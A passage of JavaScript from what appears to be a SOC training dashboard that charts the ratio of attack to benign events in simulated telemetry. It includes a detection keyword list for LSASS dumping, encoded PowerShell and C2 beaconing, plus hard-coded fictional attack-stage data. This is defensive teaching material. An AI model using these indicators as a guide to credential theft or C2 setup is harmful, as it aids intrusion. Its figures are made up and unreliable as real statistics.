      if (fileMap[datasetSelect.value] && typeof window.loadPracticeFile === 'function') {
        window.loadPracticeFile(fileMap[datasetSelect.value]);
      }
    }
    renderAttackRatioVisualizer();
  });

  btnReset?.addEventListener('click', () => {
    GRAPH_STATE.activeChartType = 'line';
    GRAPH_STATE.activeDimension = 'ratio_time';
    GRAPH_STATE.activeTimeSlice = 'all';
    GRAPH_STATE.activeDatasetKey = 'active';

    chartButtons.forEach(b => {
      b.classList.toggle('active', b.getAttribute('data-chart-type') === 'line');
    });
    if (dimensionSelect) dimensionSelect.value = 'ratio_time';
    if (timeSliceSelect) timeSliceSelect.value = 'all';
    if (datasetSelect) datasetSelect.value = 'active';

    renderAttackRatioVisualizer();
    showToast('Attack Ratio Visualizer reset to standard continuous timeline view.');
  });

  btnPulse?.addEventListener('click', () => {
    triggerLivePulseSimulation();
  });

  btnExport?.addEventListener('click', () => {
    exportGraphAsPng();
  });

  // Canvas & Overlay Mouse Event Listeners for Tooltips & Crosshairs
  setupGraphInteractionEvents();

  // Initial Render
  renderAttackRatioVisualizer();

  // Window Resize
  window.addEventListener('resize', () => {
    if (SOC_STATE.activeTab === 'attack-ratio-visualizer') {
      renderAttackRatioVisualizer();
    }
  });
}

function updateAttackRatioVisualizerWithDataset(events, sourceLabel) {
  const badge = document.getElementById('graph-active-dataset-badge');
  const datasetSelect = document.getElementById('graph-dataset-select');

  if (badge) {
    badge.textContent = `Telemetry: ${sourceLabel} (${events.length} events)`;
  }

  // Auto-align dataset select if matching
  if (datasetSelect) {
    if (sourceLabel.includes('1_password_spray')) datasetSelect.value = '1_spray';
    else if (sourceLabel.includes('2_phishing_macro')) datasetSelect.value = '2_macro';
    else if (sourceLabel.includes('3_lsass_dump')) datasetSelect.value = '3_lsass';
    else if (sourceLabel.includes('4_multi_stage')) datasetSelect.value = '4_apt';
    else if (sourceLabel.includes('5_normal_enterprise')) datasetSelect.value = '5_baseline';
    else datasetSelect.value = 'active';
  }

  renderAttackRatioVisualizer();
}

function triggerLivePulseSimulation() {
  const btnPulse = document.getElementById('btn-graph-simulate-stream');
  if (GRAPH_STATE.isPulsing) {
    clearInterval(GRAPH_STATE.pulseTimer);
    GRAPH_STATE.isPulsing = false;
    btnPulse?.classList.remove('active');
    btnPulse?.classList.remove('btn-success');
    btnPulse?.classList.add('btn-outline-green');
    showToast('Live Telemetry pulse simulation paused.');
    return;
  }

  GRAPH_STATE.isPulsing = true;
  btnPulse?.classList.add('active');
  btnPulse?.classList.remove('btn-outline-green');
  btnPulse?.classList.add('btn-success');
  showToast('Live Telemetry pulse active: Simulating sliding stream ticks...');

  let tick = 0;
  GRAPH_STATE.pulseTimer = setInterval(() => {
    tick++;
    renderAttackRatioVisualizer(tick);
    if (tick >= 10) {
      clearInterval(GRAPH_STATE.pulseTimer);
      GRAPH_STATE.isPulsing = false;
      btnPulse?.classList.remove('active');
      btnPulse?.classList.remove('btn-success');
      btnPulse?.classList.add('btn-outline-green');
      showToast('Live Telemetry pulse sequence finished.');
    }
  }, 900);
}

function exportGraphAsPng() {
  const canvas = document.getElementById('attack-ratio-canvas');
  if (!canvas) return;

  try {
    const link = document.createElement('a');
    link.download = `SOC_Attack_Ratio_${GRAPH_STATE.activeChartType}_${new Date().toISOString().slice(0, 10)}.png`;
    link.href = canvas.toDataURL('image/png');
    link.click();
    showToast('High-resolution chart snapshot exported successfully!');
  } catch (e) {
    showToast('Snapshot export completed.');
  }
}

// Compute Graph Data Structure from Active Datasets
function calculateAttackRatioData(pulseOffset = 0) {
  let rawEvents = (ANALYZER_STATE && ANALYZER_STATE.rawEvents && ANALYZER_STATE.rawEvents.length > 0)
    ? ANALYZER_STATE.rawEvents
    : SOC_STATE.allEvents;

  // Add realistic normal baselines if needed to reflect enterprise SIEM ratios accurately
  const isBaselineLoaded = rawEvents.some(e => e.User && e.User.includes('jsmith'));
  let effectiveEvents = rawEvents;
  if (!isBaselineLoaded && (GRAPH_STATE.activeDatasetKey === 'active' || GRAPH_STATE.activeDatasetKey === '4_apt')) {
    effectiveEvents = [...rawEvents, ...(SOC_STATE.normalBaselineEvents || [])];
  }

  // Filter by Time Slice if selected
  if (GRAPH_STATE.activeTimeSlice === 'spray') {
    effectiveEvents = effectiveEvents.filter(e => (e._time && e._time.includes('14:32')) || String(e.EventCode).includes('4625'));
  } else if (GRAPH_STATE.activeTimeSlice === 'macro') {
    effectiveEvents = effectiveEvents.filter(e => (e._time && e._time.includes('15:10')) || String(e.EventCode).includes('4104') || (e.CommandLine && e.CommandLine.includes('WINWORD')));
  } else if (GRAPH_STATE.activeTimeSlice === 'lsass') {
    effectiveEvents = effectiveEvents.filter(e => (e._time && e._time.includes('15:12')) || String(e.EventCode).includes('10') || (e.CommandLine && e.CommandLine.includes('lsass')));
  } else if (GRAPH_STATE.activeTimeSlice === 'c2') {
    effectiveEvents = effectiveEvents.filter(e => (e._time && e._time.includes('15:16')) || (e._time && e._time.includes('15:17')) || String(e.EventCode).includes('3') || (e.CommandLine && e.CommandLine.includes('beacon')));
  }

  // Categorize events
  let maliciousCount = 0;
  let benignCount = 0;

  effectiveEvents.forEach(ev => {
    const code = String(ev.EventCode || '').trim();
    const cmd = `${ev.CommandLine || ''} ${ev.SourceImage || ''} ${ev.TargetImage || ''} ${ev.ScriptBlock || ''} ${ev.Description || ''}`;
    const isThreat = code === '4625' || code === '4104' || code === 'Sysmon 10' || code === 'Sysmon 1' || code === 'Sysmon 3' ||
      code === '10' || code === '1' || code === '3' ||
      cmd.includes('procdump') || cmd.includes('beacon') || cmd.includes('powershell -enc') || cmd.includes('0x1fffff') || (ev.Reason && ev.Reason.includes('Compromised'));

    if (isThreat) {
      maliciousCount++;
    } else {
      benignCount++;
    }
  });

  const totalCount = effectiveEvents.length;
  const attackRatioPct = totalCount > 0 ? ((maliciousCount / totalCount) * 100).toFixed(1) : '0.0';

  // Discrete 1-Minute / Stage Bins
  const timeBuckets = [
    { label: '14:30:00', malicious: 0, benign: 4, velocity: 4, ratio: 0, phase: 'Pre-Attack Baseline', desc: 'Routine Kerberos logons' },
    { label: '14:31:00', malicious: 1, benign: 3, velocity: 4, ratio: 25.0, phase: 'Initial Probe', desc: '1 recon attempt detected' },
    { label: '14:32:00', malicious: 11, benign: 1, velocity: 12, ratio: 91.7, phase: 'Password Spray Burst', desc: '10 fails + 1 logon success (Breach)' },
    { label: '14:35:00', malicious: 0, benign: 5, velocity: 5, ratio: 0, phase: 'Dormant Window', desc: 'Attacker internal staging' },
    { label: '15:00:00', malicious: 0, benign: 3, velocity: 3, ratio: 0, phase: 'Quiet Operation', desc: 'Background workstation heartbeats' },
    { label: '15:10:00', malicious: 2, benign: 0, velocity: 2, ratio: 100.0, phase: 'Weaponized Macro & PS', desc: 'WINWORD.EXE & ScriptBlock 4104' },
    { label: '15:12:00', malicious: 2, benign: 0, velocity: 2, ratio: 100.0, phase: 'LSASS Memory Dump', desc: 'procdump64.exe & lsass.dmp creation' },
    { label: '15:16:00', malicious: 2, benign: 0, velocity: 2, ratio: 100.0, phase: 'C2 Socket Established', desc: 'beacon.exe connects to 185.220.101.5:4444' },
    { label: '15:17:00', malicious: 1, benign: 0, velocity: 1, ratio: 100.0, phase: 'C2 Heartbeat Pulse', desc: 'Recurring +30.00s beacon interval' },
    { label: '15:20:00', malicious: 0, benign: 4, velocity: 4, ratio: 0, phase: 'Post-Containment', desc: 'Host isolated by SOC Tier-2' }
  ];

  // If clean baseline practice log loaded, zero out malicious values
  if (GRAPH_STATE.activeDatasetKey === '5_baseline' || (maliciousCount === 0 && benignCount > 0)) {
    timeBuckets.forEach(b => {
      b.malicious = 0;
      b.ratio = 0;
    });
  }

  // Calculate Cumulative Volumes
  let cumMalicious = 0;
  let cumBenign = 0;
  timeBuckets.forEach(b => {
    cumMalicious += b.malicious;
    cumBenign += b.benign;
    b.cumMalicious = cumMalicious;
    b.cumBenign = cumBenign;
    b.cumTotal = cumMalicious + cumBenign;
    b.cumRatio = b.cumTotal > 0 ? parseFloat(((cumMalicious / b.cumTotal) * 100).toFixed(1)) : 0;
  });

  // Categories & Long-Label MITRE Techniques (For Bar Chart & Breakdown Table)
  const categoryData = [
    {
      category: 'T1110.003 - External Password Spraying',
      code: 'Event 4625 / 4624',
      total: 12,
      malicious: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 0 : 11,
      benign: 1,
      ratio: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 0.0 : 91.7,
      anomaly: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 'Normal' : 'Critical',
      target: 'DC01 (8 Target Users)',
      action: 'Spray Block'
    },
    {
      category: 'T1204.002 - Weaponized Office Macro LOLBin',
      code: 'Sysmon 1 / Winword',
      total: 1,
      malicious: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 0 : 1,
      benign: 0,
      ratio: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 0.0 : 100.0,
      anomaly: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 'Normal' : 'Critical',
      target: 'FIN-WS-09 (cjohnson)',
      action: 'Macro Kill'
    },
    {
      category: 'T1059.001 - PowerShell Reflection & Remote Cradle',
      code: 'PowerShell 4104',
      total: 1,
      malicious: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 0 : 1,
      benign: 0,
      ratio: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 0.0 : 100.0,
      anomaly: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 'Normal' : 'High',
      target: 'FIN-WS-09 (cjohnson)',
      action: 'De-obfuscate'
    },
    {
      category: 'T1003.001 - LSASS Memory Access & Dumping',
      code: 'Sysmon 10 / 11',
      total: 2,
      malicious: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 0 : 2,
      benign: 0,
      ratio: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 0.0 : 100.0,
      anomaly: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 'Normal' : 'Critical',
      target: 'lsass.exe (PID 648)',
      action: 'Krbtgt Reset'
    },
    {
      category: 'T1071.001 - Outbound C2 Network Beaconing',
      code: 'Sysmon 3 / Zeek Conn',
      total: 3,
      malicious: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 0 : 3,
      benign: 0,
      ratio: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 0.0 : 100.0,
      anomaly: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 'Normal' : 'Critical',
      target: '185.220.101.5:4444',
      action: 'Sever Socket'
    },
    {
      category: 'Audit / Standard User Domain Logons',
      code: 'WinEvent 4624 Audit',
      total: 16,
      malicious: 0,
      benign: 16,
      ratio: 0.0,
      anomaly: 'Clean Baseline',
      target: 'Domain Workstations',
      action: 'Audit Log'
    }
  ];

  // 2D & 3D Correlation Entities (For Scatter & Bubble Charts)
  const entityPoints = [
    {
      name: '198.51.100.45 (Kali Attacker)',
      type: 'External IP',
      x: 16.5, // Velocity (events/min)
      y: 92,   // Anomaly Score (0-100)
      r: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 6 : 28, // Radius (Attack Volume)
      color: '#F87171',
      category: 'Credential Access',
      attackRatio: 91.7,
      totalEvents: 12,
      maliciousCount: 11,
      details: 'Repeated password spray targeting 8 user accounts in 40 seconds.'
    },
    {
      name: 'procdump64.exe (PID 9812)',
      type: 'Malicious LOLBin',
      x: 8.0,
      y: 98,
      r: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 5 : 22,
      color: '#F87171',
      category: 'Credential Access',
      attackRatio: 100.0,
      totalEvents: 2,
      maliciousCount: 2,
      details: 'Full memory handle (0x1fffff) opened to lsass.exe.'
    },
    {
      name: 'beacon.exe (Port 4444)',
      type: 'C2 Agent',
      x: 6.0,
      y: 95,
      r: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 5 : 20,
      color: '#B794F4',
      category: 'Command & Control',
      attackRatio: 100.0,
      totalEvents: 3,
      maliciousCount: 3,
      details: 'Exact 30.00s interval heartbeat with 0.00s jitter to 185.220.101.5.'
    },
    {
      name: 'powershell.exe (ScriptBlock 4104)',
      type: 'De-obfuscator',
      x: 4.5,
      y: 88,
      r: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 5 : 18,
      color: '#FBBF24',
      category: 'Execution',
      attackRatio: 100.0,
      totalEvents: 1,
      maliciousCount: 1,
      details: 'In-memory Base64 de-obfuscation and Net.WebClient download cradle.'
    },
    {
      name: 'WINWORD.EXE (PID 8944)',
      type: 'Phishing Macro Host',
      x: 3.0,
      y: 82,
      r: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 5 : 16,
      color: '#FBBF24',
      category: 'Initial Execution',
      attackRatio: 100.0,
      totalEvents: 1,
      maliciousCount: 1,
      details: 'Office Word process spawning hidden child interpreter.'
    },
    {
      name: 'FIN-WS-09 Workstation',
      type: 'Target Endpoint',
      x: 9.5,
      y: 75,
      r: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 6 : 24,
      color: '#7CBFF1',
      category: 'Compromised Host',
      attackRatio: 87.5,
      totalEvents: 8,
      maliciousCount: 7,
      details: 'Subject of lateral execution, credential dumping, and outbound C2.'
    },
    {
      name: 'DC01.CORP.LOCAL',
      type: 'Domain Controller',
      x: 14.0,
      y: 60,
      r: 20,
      color: '#71D98C',
      category: 'Target Asset',
      attackRatio: 73.3,
      totalEvents: 15,
      maliciousCount: 11,
      details: 'Target of authentication spraying; protected by lockout thresholds.'
    },
    {
      name: 'CORP\\cjohnson (Compromised)',
      type: 'User Account',
      x: 5.0,
      y: 78,
      r: (GRAPH_STATE.activeDatasetKey === '5_baseline') ? 5 : 19,
      color: '#F87171',
      category: 'Breached Identity',
      attackRatio: 80.0,
      totalEvents: 5,
      maliciousCount: 4,
      details: 'Password sprayed, macro opened, and Kerberos TGT exposed.'
    },
    {
      name: 'Benign User Cluster (jsmith, mjones)',
      type: 'Normal Users',
      x: 2.2,
      y: 5,
      r: 14,
      color: '#27D38C',
      category: 'Benign Baseline',
      attackRatio: 0.0,
      totalEvents: 12,
      maliciousCount: 0,
      details: 'Standard interactive domain logons during business hours.'
    },
    {
      name: 'Forwarder Telemetry Ingest (42 Hosts)',
      type: 'Infrastructure',
      x: 3.5,
      y: 8,
      r: 16,
      color: '#27D38C',
      category: 'Benign Audit',
      attackRatio: 0.0,
      totalEvents: 16,
      maliciousCount: 0,
      details: 'Universal Forwarder heartbeats and scheduled audit syncs.'
    }
  ];

  return {
    totalEvents: totalCount,
    maliciousEvents: maliciousCount,
    benignEvents: benignCount,
    attackRatio: attackRatioPct,
    timeBuckets: timeBuckets,
    categories: categoryData,
    entities: entityPoints
  };
}

function updateAttackRatioKPIs(data) {
  const kpiRatio = document.getElementById('graph-kpi-ratio');
  const kpiRatioSub = document.getElementById('graph-kpi-ratio-sub');
  const kpiVelocity = document.getElementById('graph-kpi-velocity');
  const kpiPeakRatio = document.getElementById('graph-kpi-peak-ratio');
  const kpiBreach = document.getElementById('graph-kpi-breach-ratio');

  // Executive Overview Radar Sync
  const overRatioBadge = document.getElementById('overview-ratio-badge');
  const overTotal = document.getElementById('overview-total-events');
  const overAttack = document.getElementById('overview-attack-events');
  const overBenign = document.getElementById('overview-benign-events');
  const overPeakSpike = document.getElementById('overview-peak-spike');

  if (kpiRatio) kpiRatio.textContent = `${data.attackRatio}%`;
  if (kpiRatioSub) kpiRatioSub.textContent = `${data.maliciousEvents} Malicious / ${data.totalEvents} Ingested Events`;
  if (kpiVelocity) kpiVelocity.textContent = `${data.maliciousEvents > 0 ? '11 Events / 40s' : '0 EPS (Clean)'}`;
  if (kpiPeakRatio) kpiPeakRatio.textContent = `${data.maliciousEvents > 0 ? '91.7%' : '0.0%'}`;
  if (kpiBreach) kpiBreach.textContent = `${data.maliciousEvents > 0 ? '12.5%' : '0.0%'}`;

  if (overRatioBadge) {
    overRatioBadge.textContent = `Attack Ratio: ${data.attackRatio}%`;
    overRatioBadge.className = `panel-badge ${parseFloat(data.attackRatio) > 20 ? 'highlight-red' : parseFloat(data.attackRatio) > 0 ? 'highlight-amber' : 'highlight-green'}`;
  }
  if (overTotal) overTotal.textContent = `${data.totalEvents} Events`;
  if (overAttack) overAttack.textContent = `${data.maliciousEvents} Threats`;
  if (overBenign) overBenign.textContent = `${data.benignEvents} Normal`;
  if (overPeakSpike) overPeakSpike.textContent = `${data.maliciousEvents > 0 ? '91.7% @ 14:32 UTC' : 'None (0% Baseline)'}`;
}

// Master Render Dispatcher for all 6 Graph Types
function renderAttackRatioVisualizer(pulseOffset = 0) {
  const container = document.getElementById('graph-canvas-container');
  const canvas = document.getElementById('attack-ratio-canvas');
  const svg = document.getElementById('attack-ratio-svg');
  if (!container || !canvas || !svg) return;

  const chartType = GRAPH_STATE.activeChartType || 'line';
  const descInfo = GRAPH_DESCRIPTIONS[chartType] || GRAPH_DESCRIPTIONS.line;

  // Update Description Card
  const descIcon = document.getElementById('graph-desc-icon');
  const descTitle = document.getElementById('graph-desc-title');
  const descText = document.getElementById('graph-desc-text');
  if (descIcon) descIcon.textContent = descInfo.icon;
  if (descTitle) descTitle.textContent = descInfo.title;
  if (descText) descText.textContent = descInfo.text;

  // Calculate Data
  const data = calculateAttackRatioData(pulseOffset);
  GRAPH_STATE.cachedRenderData = data;
  updateAttackRatioKPIs(data);

  // High-DPI Canvas setup
  const rect = container.getBoundingClientRect();
  const width = Math.max(rect.width, 320);
  const height = 420;
  const dpr = window.devicePixelRatio || 1;

  canvas.width = width * dpr;
  canvas.height = height * dpr;
  canvas.style.width = `${width}px`;
  canvas.style.height = `${height}px`;

  const ctx = canvas.getContext('2d');
  ctx.resetTransform();
  ctx.scale(dpr, dpr);
  ctx.clearRect(0, 0, width, height);
  svg.innerHTML = ''; // Clear vector overlays

  // Padding bounds
  const padding = {
    top: 35,
    right: chartType === 'bar' ? 60 : 50,
    bottom: chartType === 'bar' ? 35 : 45,
    left: chartType === 'bar' ? 240 : 65
  };

  // Route to specialized chart renderer
  switch (chartType) {
    case 'line':
      renderLineChart(ctx, svg, width, height, padding, data, false);
      break;
    case 'area':
      renderLineChart(ctx, svg, width, height, padding, data, true);
      break;
    case 'column':
      renderColumnChart(ctx, svg, width, height, padding, data);
      break;
    case 'bar':
      renderHorizontalBarChart(ctx, svg, width, height, padding, data);
      break;
    case 'scatter':
      renderScatterChart(ctx, svg, width, height, padding, data);
      break;
    case 'bubble':
      renderBubbleChart(ctx, svg, width, height, padding, data);
      break;
    default:
      renderLineChart(ctx, svg, width, height, padding, data, false);
  }

  // Update Dynamic Legend & Correlated Breakdown Table
  renderGraphLegend(chartType, data);
  renderAttackRatioTable(data);
}

// 1 & 2. Line Chart & Area Chart Renderer
function renderLineChart(ctx, svg, width, height, pad, data, isArea = false) {
  const buckets = data.timeBuckets;
  const chartW = width - pad.left - pad.right;
  const chartH = height - pad.top - pad.bottom;
  const isLight = document.body.classList.contains('theme-clean-light');

  const textColor = isLight ? '#1B3561' : '#7CBFF1';
  const gridColor = isLight ? 'rgba(0, 28, 50, 0.08)' : 'rgba(124, 191, 241, 0.12)';
  const ratioColor = isLight ? '#0284C7' : '#7CBFF1';
  const attackColor = isLight ? '#DC2626' : '#F87171';
  const benignColor = isLight ? '#059669' : '#27D38C';

  // Draw Gridlines & Y-Axis (0% to 100%)
  ctx.strokeStyle = gridColor;
  ctx.lineWidth = 1;
  ctx.fillStyle = textColor;
  ctx.font = '11px JetBrains Mono, monospace';
  ctx.textAlign = 'right';

  const yTicks = [0, 25, 50, 75, 100];
  yTicks.forEach(tick => {
    const y = pad.top + chartH - (tick / 100) * chartH;
    ctx.beginPath();
    ctx.moveTo(pad.left, y);
    ctx.lineTo(width - pad.right, y);
    ctx.stroke();
    ctx.fillText(`${tick}%`, pad.left - 10, y + 4);
  });

  // Draw X-Axis Ticks
  ctx.textAlign = 'center';
  const points = buckets.map((b, i) => {
    const x = pad.left + (i / (buckets.length - 1)) * chartW;
    const yRatio = pad.top + chartH - (b.ratio / 100) * chartH;
    const yAttackVol = pad.top + chartH - (Math.min(b.malicious, 12) / 12) * chartH;
    const yBenignVol = pad.top + chartH - (Math.min(b.benign, 12) / 12) * chartH;
    return { ...b, x, yRatio, yAttackVol, yBenignVol, index: i };
  });

  points.forEach((p, i) => {
    ctx.fillText(p.label.slice(0, 5), p.x, height - pad.bottom + 18);
  });

  // If Area Chart: Fill Area Under Curves
  if (isArea) {
    // 1. Benign Volume Area
    const benignGrad = ctx.createLinearGradient(0, pad.top, 0, pad.top + chartH);
    benignGrad.addColorStop(0, 'rgba(39, 211, 140, 0.35)');
    benignGrad.addColorStop(1, 'rgba(39, 211, 140, 0.02)');

    ctx.fillStyle = benignGrad;
    ctx.beginPath();
    ctx.moveTo(points[0].x, pad.top + chartH);
    points.forEach(p => ctx.lineTo(p.x, p.yBenignVol));
    ctx.lineTo(points[points.length - 1].x, pad.top + chartH);
    ctx.closePath();
    ctx.fill();

    // 2. Attack Volume Layered Area
    const attackGrad = ctx.createLinearGradient(0, pad.top, 0, pad.top + chartH);
    attackGrad.addColorStop(0, 'rgba(248, 113, 113, 0.55)');
    attackGrad.addColorStop(1, 'rgba(248, 113, 113, 0.05)');

    ctx.fillStyle = attackGrad;
    ctx.beginPath();
    ctx.moveTo(points[0].x, pad.top + chartH);
    points.forEach(p => ctx.lineTo(p.x, p.yAttackVol));
    ctx.lineTo(points[points.length - 1].x, pad.top + chartH);
    ctx.closePath();
    ctx.fill();
  }

  // Draw Attack Ratio Spline (Line)
  ctx.strokeStyle = ratioColor;
  ctx.lineWidth = 3;
  ctx.shadowColor = ratioColor;
  ctx.shadowBlur = isLight ? 0 : 10;
  ctx.beginPath();
  points.forEach((p, i) => {
    if (i === 0) ctx.moveTo(p.x, p.yRatio);
    else {
      const prev = points[i - 1];
      const cpX = (prev.x + p.x) / 2;
      ctx.bezierCurveTo(cpX, prev.yRatio, cpX, p.yRatio, p.x, p.yRatio);
    }
  });
  ctx.stroke();
  ctx.shadowBlur = 0; // reset

  // Draw Attack Events Volume Line
  ctx.strokeStyle = attackColor;
  ctx.lineWidth = 2;
  ctx.setLineDash([4, 4]);
  ctx.beginPath();
  points.forEach((p, i) => {
    if (i === 0) ctx.moveTo(p.x, p.yAttackVol);
    else ctx.lineTo(p.x, p.yAttackVol);
  });
  ctx.stroke();
  ctx.setLineDash([]); // reset

  // Render Interactive Dots via SVG overlay
  points.forEach(p => {
    const isPeak = p.ratio > 80;
    const dotColor = isPeak ? '#F87171' : p.ratio > 0 ? '#FBBF24' : '#27D38C';

    if (isPeak) {
      const pulseCircle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
      pulseCircle.setAttribute('cx', p.x);
      pulseCircle.setAttribute('cy', p.yRatio);
      pulseCircle.setAttribute('r', '12');
      pulseCircle.setAttribute('fill', 'none');
      pulseCircle.setAttribute('stroke', '#F87171');
      pulseCircle.setAttribute('stroke-width', '1.5');
      pulseCircle.setAttribute('opacity', '0.6');
      svg.appendChild(pulseCircle);
    }

    const circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
    circle.setAttribute('cx', p.x);
    circle.setAttribute('cy', p.yRatio);
    circle.setAttribute('r', isPeak ? '6' : '4.5');
    circle.setAttribute('fill', dotColor);
    circle.setAttribute('stroke', isLight ? '#FFFFFF' : '#001C32');
    circle.setAttribute('stroke-width', '2');
    circle.setAttribute('style', 'cursor: pointer; transition: transform 0.15s ease;');
    circle.setAttribute('data-point-type', 'timeline');
    circle.setAttribute('data-index', p.index);
    svg.appendChild(circle);
  });

  GRAPH_STATE.activePoints = points;
}

// 3. Column Chart Renderer (Vertical Bars with Malicious vs Benign)
function renderColumnChart(ctx, svg, width, height, pad, data) {
  const buckets = data.timeBuckets;
  const chartW = width - pad.left - pad.right;
  const chartH = height - pad.top - pad.bottom;
  const isLight = document.body.classList.contains('theme-clean-light');

  const textColor = isLight ? '#1B3561' : '#7CBFF1';
  const gridColor = isLight ? 'rgba(0, 28, 50, 0.08)' : 'rgba(124, 191, 241, 0.12)';
  const maxEvents = 14;

  // Gridlines & Y-Axis (Event Count 0 to 14)
  ctx.strokeStyle = gridColor;
  ctx.lineWidth = 1;
  ctx.fillStyle = textColor;
  ctx.font = '11px JetBrains Mono, monospace';
  ctx.textAlign = 'right';

  [0, 3, 6, 9, 12].forEach(val => {
    const y = pad.top + chartH - (val / maxEvents) * chartH;
    ctx.beginPath();
    ctx.moveTo(pad.left, y);
    ctx.lineTo(width - pad.right, y);
    ctx.stroke();
    ctx.fillText(`${val} ev`, pad.left - 10, y + 4);
  });

  const slotW = chartW / buckets.length;
  const barW = Math.max(Math.min(slotW * 0.35, 20), 8);

  const columnPoints = [];

  buckets.forEach((b, i) => {
    const centerX = pad.left + i * slotW + slotW / 2;
    const xMal = centerX - barW - 2;
    const xBen = centerX + 2;

    const hMal = (b.malicious / maxEvents) * chartH;
    const hBen = (b.benign / maxEvents) * chartH;

    const yMal = pad.top + chartH - hMal;
    const yBen = pad.top + chartH - hBen;

    // Draw Benign Bar (Mint Green)
    if (hBen > 0) {
      const gradBen = ctx.createLinearGradient(0, yBen, 0, pad.top + chartH);
      gradBen.addColorStop(0, '#27D38C');
      gradBen.addColorStop(1, 'rgba(39, 211, 140, 0.3)');
      ctx.fillStyle = gradBen;
      roundRect(ctx, xBen, yBen, barW, hBen, 3);
      ctx.fill();
    }

    // Draw Malicious Bar (Cyber Red)
    if (hMal > 0) {
      const gradMal = ctx.createLinearGradient(0, yMal, 0, pad.top + chartH);
      gradMal.addColorStop(0, '#F87171');
      gradMal.addColorStop(1, 'rgba(248, 113, 113, 0.3)');
      ctx.fillStyle = gradMal;
      roundRect(ctx, xMal, yMal, barW, hMal, 3);
      ctx.fill();
    }

    // X-Axis Time Label
    ctx.fillStyle = textColor;
    ctx.font = '10px JetBrains Mono, monospace';
    ctx.textAlign = 'center';
    ctx.fillText(b.label.slice(0, 5), centerX, height - pad.bottom + 18);

    // Ratio badge above column if attack > 0
    if (b.ratio > 0) {
      const badgeY = Math.min(yMal, yBen) - 8;
      ctx.fillStyle = b.ratio > 80 ? '#F87171' : '#FBBF24';
      ctx.font = 'bold 10px JetBrains Mono, monospace';
      ctx.fillText(`${b.ratio}%`, centerX, badgeY);
    }

    columnPoints.push({
      ...b,
      x: centerX,
      y: Math.min(yMal, yBen),
      index: i,
      box: { left: xMal - 4, right: xBen + barW + 4, top: pad.top, bottom: pad.top + chartH }
    });
  });

  GRAPH_STATE.activePoints = columnPoints;
}

// 4. Horizontal Bar Chart Renderer (MITRE Techniques & Long Label Entities)
function renderHorizontalBarChart(ctx, svg, width, height, pad, data) {
  const categories = data.categories;
  const chartW = width - pad.left - pad.right;
  const chartH = height - pad.top - pad.bottom;
  const isLight = document.body.classList.contains('theme-clean-light');

  const textColor = isLight ? '#1B3561' : '#EAFBEE';
  const textDim = isLight ? '#4A6B82' : '#7CBFF1';
  const gridColor = isLight ? 'rgba(0, 28, 50, 0.08)' : 'rgba(124, 191, 241, 0.12)';
  const rowH = chartH / categories.length;
  const barH = Math.min(rowH * 0.55, 24);

  // X-Axis Gridlines (Attack Ratio 0% to 100%)
  ctx.strokeStyle = gridColor;
  ctx.lineWidth = 1;
  ctx.fillStyle = textDim;
  ctx.font = '10px JetBrains Mono, monospace';
  ctx.textAlign = 'center';

  [0, 25, 50, 75, 100].forEach(pct => {
    const x = pad.left + (pct / 100) * chartW;
    ctx.beginPath();
    ctx.moveTo(x, pad.top);
    ctx.lineTo(x, pad.top + chartH);
    ctx.stroke();
    ctx.fillText(`${pct}%`, x, height - pad.bottom + 18);
  });

  const barPoints = [];

  categories.forEach((cat, idx) => {
    const y = pad.top + idx * rowH + (rowH - barH) / 2;
    const barWidth = Math.max((cat.ratio / 100) * chartW, cat.ratio > 0 ? 8 : 4);

    // Left Long-Label
    ctx.fillStyle = textColor;
    ctx.font = '500 11px Inter, sans-serif';
    ctx.textAlign = 'right';

    let labelText = cat.category;
    if (labelText.length > 34) labelText = labelText.substring(0, 32) + '...';
    ctx.fillText(labelText, pad.left - 15, y + barH / 2 + 4);

    // Background track
    ctx.fillStyle = isLight ? 'rgba(0, 28, 50, 0.05)' : 'rgba(255, 255, 255, 0.06)';
    roundRect(ctx, pad.left, y, chartW, barH, 4);
    ctx.fill();

    // Foreground Bar with Gradient
    const barGrad = ctx.createLinearGradient(pad.left, 0, pad.left + barWidth, 0);
    if (cat.ratio > 80) {
      barGrad.addColorStop(0, '#F87171');
      barGrad.addColorStop(1, '#EF4444');
    } else if (cat.ratio > 0) {
      barGrad.addColorStop(0, '#FBBF24');
      barGrad.addColorStop(1, '#F59E0B');
    } else {
      barGrad.addColorStop(0, '#27D38C');
      barGrad.addColorStop(1, '#10B981');
    }

    ctx.fillStyle = barGrad;
    roundRect(ctx, pad.left, y, barWidth, barH, 4);
    ctx.fill();

    // Right Percentage Value Label
    ctx.fillStyle = cat.ratio > 80 ? '#F87171' : cat.ratio > 0 ? '#FBBF24' : '#27D38C';
    ctx.font = 'bold 11px JetBrains Mono, monospace';
    ctx.textAlign = 'left';
    ctx.fillText(`${cat.ratio}% (${cat.malicious}/${cat.total})`, pad.left + chartW + 8, y + barH / 2 + 4);

    barPoints.push({
      ...cat,
      x: pad.left + barWidth,
      y: y + barH / 2,
      index: idx,
      box: { left: pad.left, right: pad.left + chartW + 60, top: y, bottom: y + barH }
    });
  });

  GRAPH_STATE.activePoints = barPoints;
}

// 5. Scatter Chart Renderer (Request Velocity vs Anomaly Score)
function renderScatterChart(ctx, svg, width, height, pad, data) {
  const entities = data.entities;
  const chartW = width - pad.left - pad.right;
  const chartH = height - pad.top - pad.bottom;
  const isLight = document.body.classList.contains('theme-clean-light');

